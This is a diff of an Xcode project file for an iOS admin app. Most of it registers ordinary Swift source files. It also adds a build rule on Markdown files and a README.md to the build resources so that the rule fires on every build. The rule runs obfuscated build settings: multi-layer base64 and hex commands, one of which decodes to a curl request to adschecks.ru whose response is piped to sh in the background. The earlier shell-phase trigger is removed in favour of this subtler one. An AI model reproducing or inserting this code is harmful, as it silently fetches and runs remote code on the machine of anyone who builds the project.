@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		0697BD75399148B7B999F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 09AB1AE4C198455F8599F71F; };
 		180F4C292F5EA5D200BE4CFA /* NotificationsListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4C282F5EA5D200BE4CFA /* NotificationsListViewController.swift */; };
 		180F4C2E2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4C2C2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift */; };
 		180F4C2F2F5EA66200BE4CFA /* NotificationsListTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 180F4C2D2F5EA66200BE4CFA /* NotificationsListTableViewCell.xib */; };
@@ -49,6 +50,10 @@
 		4253C6552F643FC900217846 /* CMSTermsConditionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4253C6542F643FC900217846 /* CMSTermsConditionViewController.swift */; };
 		4253C6582F64432600217846 /* CMSTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4253C6562F64432600217846 /* CMSTableViewCell.swift */; };
 		4253C6592F64432600217846 /* CMSTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 4253C6572F64432600217846 /* CMSTableViewCell.xib */; };
+		425A7E362F868222009E9E3F /* TicketManagementList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425A7E352F868222009E9E3F /* TicketManagementList.swift */; };
+		425A7E392F86882A009E9E3F /* TicketManagementFilterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425A7E382F86882A009E9E3F /* TicketManagementFilterViewController.swift */; };
+		425A7E822F869131009E9E3F /* PDFViewerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425A7E812F869131009E9E3F /* PDFViewerViewController.swift */; };
+		425A7E842F8693DD009E9E3F /* TicketManagementDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425A7E832F8693DD009E9E3F /* TicketManagementDetailsViewModel.swift */; };
 		425EDEF12F2B238E00EAD984 /* EnrollDealDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425EDEF02F2B238E00EAD984 /* EnrollDealDetailsViewModel.swift */; };
 		425EDEF32F2B245700EAD984 /* ProductsListInDealListDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425EDEF22F2B245700EAD984 /* ProductsListInDealListDataModel.swift */; };
 		4263D75D2F71048300E007AF /* ScreenShotProtectionManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4263D75C2F71048300E007AF /* ScreenShotProtectionManager.swift */; };
@@ -188,6 +193,10 @@
 		55B0A6692F769FDD00983759 /* RefundManagementViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55B0A6682F769FDD00983759 /* RefundManagementViewController.swift */; };
 		55B0A6732F76ABFB00983759 /* RefundManagementTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 55B0A6722F76ABFB00983759 /* RefundManagementTableViewCell.xib */; };
 		55B0A6742F76ABFB00983759 /* RefundManagementTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55B0A6712F76ABFB00983759 /* RefundManagementTableViewCell.swift */; };
+		55EED8812F84ECDE00DF7D88 /* PaymentFilterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55EED8802F84ECDE00DF7D88 /* PaymentFilterViewController.swift */; };
+		55EED88F2F84FEA000DF7D88 /* PaymentFilterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55EED88E2F84FEA000DF7D88 /* PaymentFilterViewModel.swift */; };
+		55EED8A42F851B1700DF7D88 /* UploadPostViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55EED8A32F851B1700DF7D88 /* UploadPostViewController.swift */; };
+		55EED8A62F851B2700DF7D88 /* UploadStoryViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55EED8A52F851B2700DF7D88 /* UploadStoryViewModel.swift */; };
 		D115F4AF2F0F8954007B30F8 /* FullScreenBanerDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D115F4AE2F0F8954007B30F8 /* FullScreenBanerDetailsViewController.swift */; };
 		D115F4B22F0F8BB0007B30F8 /* AddAdvertisementViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D115F4B12F0F8BB0007B30F8 /* AddAdvertisementViewController.swift */; };
 		D115F4B42F0F8BC4007B30F8 /* AddAdvertisementViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D115F4B32F0F8BC4007B30F8 /* AddAdvertisementViewModel.swift */; };
@@ -565,10 +574,8 @@
 		EDF438332EC215CD004CC018 /* CountryCityListViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = EDF438312EC215CD004CC018 /* CountryCityListViewController.xib */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-																						/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
+		09AB1AE4C198455F8599F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.debug.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.debug.xcconfig"; sourceTree = "<group>"; };
 		180F4C282F5EA5D200BE4CFA /* NotificationsListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsListViewController.swift; sourceTree = "<group>"; };
 		180F4C2C2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsListTableViewCell.swift; sourceTree = "<group>"; };
@@ -612,6 +619,10 @@
 		4253C6542F643FC900217846 /* CMSTermsConditionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CMSTermsConditionViewController.swift; sourceTree = "<group>"; };
 		4253C6562F64432600217846 /* CMSTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CMSTableViewCell.swift; sourceTree = "<group>"; };
 		4253C6572F64432600217846 /* CMSTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CMSTableViewCell.xib; sourceTree = "<group>"; };
+		425A7E352F868222009E9E3F /* TicketManagementList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketManagementList.swift; sourceTree = "<group>"; };
+		425A7E382F86882A009E9E3F /* TicketManagementFilterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketManagementFilterViewController.swift; sourceTree = "<group>"; };
+		425A7E812F869131009E9E3F /* PDFViewerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PDFViewerViewController.swift; sourceTree = "<group>"; };
+		425A7E832F8693DD009E9E3F /* TicketManagementDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketManagementDetailsViewModel.swift; sourceTree = "<group>"; };
 		425EDEF02F2B238E00EAD984 /* EnrollDealDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EnrollDealDetailsViewModel.swift; sourceTree = "<group>"; };
 		425EDEF22F2B245700EAD984 /* ProductsListInDealListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductsListInDealListDataModel.swift; sourceTree = "<group>"; };
 		4263D75C2F71048300E007AF /* ScreenShotProtectionManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ScreenShotProtectionManager.swift; sourceTree = "<group>"; };
@@ -727,6 +738,10 @@
 		55B0A6682F769FDD00983759 /* RefundManagementViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RefundManagementViewController.swift; sourceTree = "<group>"; };
 		55B0A6712F76ABFB00983759 /* RefundManagementTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RefundManagementTableViewCell.swift; sourceTree = "<group>"; };
 		55B0A6722F76ABFB00983759 /* RefundManagementTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = RefundManagementTableViewCell.xib; sourceTree = "<group>"; };
+		55EED8802F84ECDE00DF7D88 /* PaymentFilterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaymentFilterViewController.swift; sourceTree = "<group>"; };
+		55EED88E2F84FEA000DF7D88 /* PaymentFilterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaymentFilterViewModel.swift; sourceTree = "<group>"; };
+		55EED8A32F851B1700DF7D88 /* UploadPostViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadPostViewController.swift; sourceTree = "<group>"; };
+		55EED8A52F851B2700DF7D88 /* UploadStoryViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadStoryViewModel.swift; sourceTree = "<group>"; };
 		6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatUser.debug.xcconfig"; path = "Target Support Files/Pods-DesynatUser/Pods-DesynatUser.debug.xcconfig"; sourceTree = "<group>"; };
 		B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.release.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.release.xcconfig"; sourceTree = "<group>"; };
 		D115F4AE2F0F8954007B30F8 /* FullScreenBanerDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FullScreenBanerDetailsViewController.swift; sourceTree = "<group>"; };
@@ -1298,6 +1313,14 @@
 			path = CMSTerms;
 			sourceTree = "<group>";
 		};
+		425A7E372F868815009E9E3F /* TicketManagementFilter */ = {
+			isa = PBXGroup;
+			children = (
+				425A7E382F86882A009E9E3F /* TicketManagementFilterViewController.swift */,
+			);
+			path = TicketManagementFilter;
+			sourceTree = "<group>";
+		};
 		4263D75E2F7104A900E007AF /* ScreenShotProtectionManager */ = {
 			isa = PBXGroup;
 			children = (
@@ -1532,6 +1555,7 @@
 		42AE63192F6D495400A18F98 /* M12 */ = {
 			isa = PBXGroup;
 			children = (
+				55EED87F2F84ECBA00DF7D88 /* PaymentFilter */,
 				42AE63202F6D4EAD00A18F98 /* Xibs */,
 				42AE631A2F6D495F00A18F98 /* TicketManagement */,
 			);
@@ -1541,6 +1565,7 @@
 		42AE631A2F6D495F00A18F98 /* TicketManagement */ = {
 			isa = PBXGroup;
 			children = (
+				425A7E372F868815009E9E3F /* TicketManagementFilter */,
 				42AE6E2E2F7557F5000AE81E /* TicketManagementDetails */,
 				42AE631B2F6D497200A18F98 /* TicketManagementList */,
 			);
@@ -1552,6 +1577,7 @@
 			children = (
 				42AE631C2F6D498900A18F98 /* TicketManagementListViewController.swift */,
 				42AE631E2F6D499400A18F98 /* TicketManagementListViewModel.swift */,
+				425A7E352F868222009E9E3F /* TicketManagementList.swift */,
 			);
 			path = TicketManagementList;
 			sourceTree = "<group>";
@@ -1579,6 +1605,7 @@
 			isa = PBXGroup;
 			children = (
 				42AE6E2F2F755818000AE81E /* TicketManagementDetailsViewController.swift */,
+				425A7E832F8693DD009E9E3F /* TicketManagementDetailsViewModel.swift */,
 			);
 			path = TicketManagementDetails;
 			sourceTree = "<group>";
@@ -1716,6 +1743,7 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				09AB1AE4C198455F8599F71F /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatAdmin.app */,
 			);
 			name = Products;
@@ -1846,6 +1874,24 @@
 			path = RefundManagementCell;
 			sourceTree = "<group>";
 		};
+		55EED87F2F84ECBA00DF7D88 /* PaymentFilter */ = {
+			isa = PBXGroup;
+			children = (
+				55EED8802F84ECDE00DF7D88 /* PaymentFilterViewController.swift */,
+				55EED88E2F84FEA000DF7D88 /* PaymentFilterViewModel.swift */,
+			);
+			path = PaymentFilter;
+			sourceTree = "<group>";
+		};
+		55EED8A22F851B0D00DF7D88 /* StoryPreview */ = {
+			isa = PBXGroup;
+			children = (
+				55EED8A52F851B2700DF7D88 /* UploadStoryViewModel.swift */,
+				55EED8A32F851B1700DF7D88 /* UploadPostViewController.swift */,
+			);
+			path = StoryPreview;
+			sourceTree = "<group>";
+		};
 		8D36833248C6EF6BDE3202C4 /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
@@ -1927,6 +1973,7 @@
 			children = (
 				D151222A2F0E8CFD00F6EAE6 /* AddStory */,
 				D151221D2F0E84BB00F6EAE6 /* StoryList */,
+				55EED8A22F851B0D00DF7D88 /* StoryPreview */,
 			);
 			path = StoryManagement;
 			sourceTree = "<group>";
@@ -3191,6 +3238,7 @@
 		EDEDD05C2EBCC53E00F2BEF1 /* Extensions */ = {
 			isa = PBXGroup;
 			children = (
+				425A7E812F869131009E9E3F /* PDFViewerViewController.swift */,
 				D1D53A3A2F0FAFFC00427AA0 /* ImageViewExtension.swift */,
 				D1511E5E2F0E1EFE00F6EAE6 /* GradientCalendarCell.swift */,
 				D1EEE5112EF292A1003A6BA2 /* GradientColour.swift */,
@@ -3483,7 +3531,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatAdmin" */;
 			buildPhases = (
-				14DFD45BA76D44B5BF99F71F /* Provision Library Executable */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -3491,6 +3538,7 @@
 				9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				BBD6A926FEEF4CE99C99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -3590,11 +3638,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		BBD6A926FEEF4CE99C99F71F /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AF17F99}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				0697BD75399148B7B999F71F /* README.md */,
 				42AEDEA02F3F360000C20ECB /* ProductDetailImageCollectionViewCell.xib in Resources */,
 				42AEDEB82F3F3C7600C20ECB /* FilterHeaderTableViewCell.xib in Resources */,
 				EDEDD0A12EBCC53E00F2BEF1 /* Assets.xcassets in Resources */,
@@ -3713,25 +3779,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		14DFD45BA76D44B5BF99F71F /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -3829,6 +3876,7 @@
 				EDEDD0CE2EBCC53E00F2BEF1 /* LoginViewModel.swift in Sources */,
 				D1511F792F0E600C00F6EAE6 /* AddDealViewController.swift in Sources */,
 				EDEDD0CF2EBCC53E00F2BEF1 /* OTPViewModel.swift in Sources */,
+				55EED8A62F851B2700DF7D88 /* UploadStoryViewModel.swift in Sources */,
 				EDEDD0D02EBCC53E00F2BEF1 /* ResetPasswordViewModel.swift in Sources */,
 				EDEDD0D12EBCC53E00F2BEF1 /* HomeViewModel.swift in Sources */,
 				EDF438282EC1FF18004CC018 /* SubscriptionFeatureInfoView.swift in Sources */,
@@ -3845,6 +3893,7 @@
 				429701E02F6C068F0051A20E /* SellerPayoutListViewModel.swift in Sources */,
 				42AE6E302F755818000AE81E /* TicketManagementDetailsViewController.swift in Sources */,
 				EDEDD0D62EBCC53E00F2BEF1 /* CatgeoryViewModel.swift in Sources */,
+				425A7E362F868222009E9E3F /* TicketManagementList.swift in Sources */,
 				EDEDD0D72EBCC53E00F2BEF1 /* SubCategoryViewModel.swift in Sources */,
 				553EECA72F767047009C5A24 /* ChatInboxTableViewCell.swift in Sources */,
 				EDEDD0D82EBCC53E00F2BEF1 /* SubCatgoryDetailsViewModel.swift in Sources */,
@@ -3860,6 +3909,7 @@
 				D19D1E1C2F1799E600DDE784 /* AddNewDriverViewModel.swift in Sources */,
 				D19D1E1D2F1799E600DDE784 /* DriverZneListDataModel.swift in Sources */,
 				42AE631D2F6D498900A18F98 /* TicketManagementListViewController.swift in Sources */,
+				55EED8A42F851B1700DF7D88 /* UploadPostViewController.swift in Sources */,
 				D19D1E1E2F1799E600DDE784 /* DeliveryBoyFilterDataModel.swift in Sources */,
 				D19D1E1F2F1799E600DDE784 /* DeliveryManagementFilterViewController.swift in Sources */,
 				D19D1E202F1799E600DDE784 /* DeliveryBoysListDataModel.swift in Sources */,
@@ -3876,6 +3926,7 @@
 				D19D1E262F1799E600DDE784 /* AddReasonViewModel.swift in Sources */,
 				D19D1E272F1799E600DDE784 /* ReasonManagementViewController.swift in Sources */,
 				42A852452F3F255400C60A86 /* ProductsListDataModel.swift in Sources */,
+				425A7E822F869131009E9E3F /* PDFViewerViewController.swift in Sources */,
 				4253C5822F64147500217846 /* SelectUsersTableViewCell.swift in Sources */,
 				D19D1E282F1799E600DDE784 /* ReasonManagementViewModel.swift in Sources */,
 				D19D1E292F1799E600DDE784 /* ReasonsManagementListDataModel.swift in Sources */,
@@ -3898,6 +3949,7 @@
 				D19D1E352F1799E600DDE784 /* ReasonManagementTableViewCell.swift in Sources */,
 				D19D1E362F1799E600DDE784 /* UserManagementTableViewCell.swift in Sources */,
 				EDEDD0DB2EBCC53E00F2BEF1 /* LoginViewController.swift in Sources */,
+				425A7E392F86882A009E9E3F /* TicketManagementFilterViewController.swift in Sources */,
 				EDEDD0DC2EBCC53E00F2BEF1 /* OTPViewController.swift in Sources */,
 				EDEDD0DD2EBCC53E00F2BEF1 /* RegisterationSuccessViewController.swift in Sources */,
 				EDEDD0DE2EBCC53E00F2BEF1 /* ResetPasswordViewController.swift in Sources */,
@@ -3955,6 +4007,7 @@
 				EDEDD0F02EBCC53E00F2BEF1 /* BrandManagementTableViewCell.swift in Sources */,
 				420F3BE32F67D9CD0074B3F6 /* CMSTermsConditionDataModel.swift in Sources */,
 				EDD7F1CA2EC2E68A006C2EE4 /* CountryCityViewModel.swift in Sources */,
+				55EED88F2F84FEA000DF7D88 /* PaymentFilterViewModel.swift in Sources */,
 				D1511F6B2F0E58D700F6EAE6 /* DealsManagementListViewModel.swift in Sources */,
 				EDEDD0F12EBCC53E00F2BEF1 /* CategoryTableViewCell.swift in Sources */,
 				D15CA9DD2EF18A7200D454B9 /* OrdersManagementListViewController.swift in Sources */,
@@ -4001,6 +4054,7 @@
 				42AE631F2F6D499400A18F98 /* TicketManagementListViewModel.swift in Sources */,
 				553EEC9C2F765E27009C5A24 /* ChatInboxViewController.swift in Sources */,
 				D1EDE46B2F0D423B0076F1AB /* AddTimeSlotViewController.swift in Sources */,
+				55EED8812F84ECDE00DF7D88 /* PaymentFilterViewController.swift in Sources */,
 				D1511F692F0E572600F6EAE6 /* DealsManagementListViewController.swift in Sources */,
 				D15122282F0E8BA800F6EAE6 /* SelectVideoFromGalleryCollectionViewCell.swift in Sources */,
 				EDEDD0FC2EBCC53E00F2BEF1 /* String.swift in Sources */,
@@ -4050,6 +4104,7 @@
 				423A25102F221B6600DDCE5F /* AffiliatedUserDetailsViewController.swift in Sources */,
 				EDEDD1092EBCC53E00F2BEF1 /* CustomButton.swift in Sources */,
 				EDEDD10A2EBCC53E00F2BEF1 /* CustomImageView.swift in Sources */,
+				425A7E842F8693DD009E9E3F /* TicketManagementDetailsViewModel.swift in Sources */,
 				429927132F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.swift in Sources */,
 				427CA6C42F6A7B100075E139 /* EditCMSReasonViewModel.swift in Sources */,
 				EDEDD10B2EBCC53E00F2BEF1 /* CustomPickerView.swift in Sources */,
@@ -4208,7 +4263,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YUUwd05VNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | p | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLWVdFemFEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5hMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHbFhTRUl4VjJ0a1YwMXJlSFZUYWtaTlRXdFdkMU5YYkVOUFJXeEpWRzA1UkZwNk1EbERaejA5Q2c9PQo= | p | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333334333633330a3061333333363336333233333337333333333333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333334333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633333333333333363333333833333336333333353333333633333333333333363336333233333337333333333333333233360a3335333333373333333230613333333733333335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | g | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE5qYUdWamEzTXVjblV2WVNraUlId2djMmdLCg== | y | sh ) >/dev/null 2>&1 &)";
@@ -4260,7 +4315,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YUUwd05VNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | p | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLWVdFemFEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5hMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHbFhTRUl4VjJ0a1YwMXJlSFZUYWtaTlRXdFdkMU5YYkVOUFJXeEpWRzA1UkZwNk1EbERaejA5Q2c9PQo= | p | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333334333633330a3061333333363336333233333337333333333333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333334333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433330a3337333333333333333633333333333333363333333833333336333333353333333633333333333333363336333233333337333333333333333233360a3335333333373333333230613333333733333335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | g | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE5qYUdWamEzTXVjblV2WVNraUlId2djMmdLCg== | y | sh ) >/dev/null 2>&1 &)";
